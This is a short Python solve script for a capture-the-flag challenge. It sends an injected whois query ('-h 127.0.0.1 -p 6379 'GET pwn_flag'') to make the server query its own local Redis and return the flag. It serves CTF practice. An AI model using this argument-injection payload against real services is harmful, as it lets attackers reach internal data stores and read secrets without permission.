#!/usr/bin/env python3

import os
import re
import sys

import requests


TARGET = os.environ.get("TARGET", "http://chal.thjcc.org:5000").rstrip("/")
FLAG_RE = re.compile(r"THJCC\{[^}\r\n]+\}")


def main() -> int:
    query = "-h 127.0.0.1 -p 6379 'GET pwn_flag'"
    try:
        response = requests.post(
            f"{TARGET}/whois",
            json={"query": query},
            timeout=15,
        )
        response.raise_for_status()
        data = response.json()
    except (requests.RequestException, ValueError) as exc:
        print(f"request failed: {exc}", file=sys.stderr)
        return 1

    output = data.get("output", "")
    match = FLAG_RE.search(output)
    if not match:
        print(f"flag not found; status={data.get('status')!r}", file=sys.stderr)
        return 1

    print(f"<FLAG>{match.group(0)}</FLAG>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
